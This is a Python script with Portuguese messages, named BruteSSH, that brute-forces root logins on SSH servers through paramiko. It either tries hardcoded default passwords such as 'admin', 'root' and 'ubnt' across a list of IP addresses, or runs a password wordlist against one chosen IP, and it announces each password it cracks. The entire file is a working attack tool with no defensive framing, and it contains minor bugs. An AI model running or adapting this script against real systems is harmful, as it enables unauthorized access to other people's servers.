#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os
import sys
import argparse
try:
    import paramiko
except:
    os.system("clear")
    print("Instale a lib paramiko ")
    quit()

# Conecções....
user, porta = "root", 22
ssh = paramiko.SSHClient()
ssh.load_system_host_keys()
ssh.set_missing_host_key_policy(paramiko.MissingHostKeyPolicy())


def Sistema():
    if sys.platform != 'linux2':
        os.system("cls")
    else:
        os.system("clear")


def Banner():
    print("""\033[1;37m
    ██████╗ ██████╗ ██╗   ██╗████████╗███████╗    ███████╗██╗  ██╗██╗  ██╗
    ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝    ██╔════╝██║  ██║██║  ██║
    ██████╔╝██████╔╝██║   ██║   ██║   █████╗      ███████╗███████║███████║
    ██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝      ╚════██║██╔══██║██╔══██║
    ██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗    ███████║██║  ██║██║  ██║
    ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝    ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝\033[0m
\033[0;31m      Tamo junto: Anderson, Raphael e OverKiller <3 
                                  By: Pedro Souza 
    \033[0m""")


def Lista(ips):
    Sistema()
    Banner()
    for ip in ips:
        ip = ip.replace("\n", "").replace("\r", "")
        print("\033[1;31m-------------------: Testando: " + ip)
        for senha in ['admin', 'root', 'admin123', '@adm1in', '@admin', 'ubnt']:
            try:
                ssh.connect(ip, port=porta, username=user, password=senha)
                print(
                    "\033[1;32mPow! Pow! Pow! senha do Server: " + senha + "\033[0m")
                break
            except KeyboardInterrupt:
                print("\033[1;37m\nCnacelando Brute Force...")
                print("Bye\033[0m")
                quit()
            except paramiko.AuthenticationException, error:
                print("\033[1;35mPassword incorreto: " + senha)
            except:
                print("\033[1;37mConexão negada!\033[0m")
                break


def Senhas(senha, ip):
    Sistema()
    Banner()
    print("\033[1;31m-------------------- Brute Force: " + ip)
    for i in senha:
        i = i.replace("\n", "").replace("\r", "")
        try:
            ssh.connect(ip, port=porta, username=user, password=i)
            print("\033[1;32mPow! PoW! Pow! senha do Server: " +
                  senha + "\033[0m")
            break
        except KeyboardInterrupt:
            print "\033[1;37m\nCnacelando Brute Force...",
            print "Bye\033[0m"
            quit()
        except paramiko.AuthenticationException, error:
            print "\033[1;35mPassword incorreto: " + i + "\033[0m"
        except:
            print "\033[1;37mConexão negada!\033[0m"
            break


def Argumentos():
    parse = argparse.ArgumentParser()
    parse.add_argument("--tipo", action="store", dest="tipo", required=True,
                       help="Escolha o tipo de Brute Force, senha ou lista...")
    parse.add_argument("--senha", action="store", dest="senha",
                       help="Caminho da WordList com as senhas.")
    parse.add_argument("--ip", action="store", dest="ip",
                       help="IP que será realizado o Brute Force com a lista de senahs...")
    parse.add_argument("--lista", action="store", dest="lista",
                       help="Caminho da WordList com IP's..")
    args = parse.parse_args()
    if args.tipo.lower() == "lista":
        lista = args.lista
        lista = open(lista, "r").readlines()
        Lista(lista)
    elif args.tipo.lower() == 'senha':
        senha = args.senha
        senha = open(senha, "r").readlines()
        ip = args.ip
        Senhas(senha, ip)
    else:
        print """
        Use "./BruteSSH --tipo lista --lista listaIP.txt"
        Esses exemplo usa uma lista de SSH para tentar o Brute Force com palavras padrões.
        Ou "./BruteSSH.py --tipo senha --senha listaSenhas.txt --ip 192.168.0.1" 
        Esse já tenta o Brute Force em um determinado IP com uma lista de senha que o usuário dispõe. 

        """
Sistema()
Argumentos()
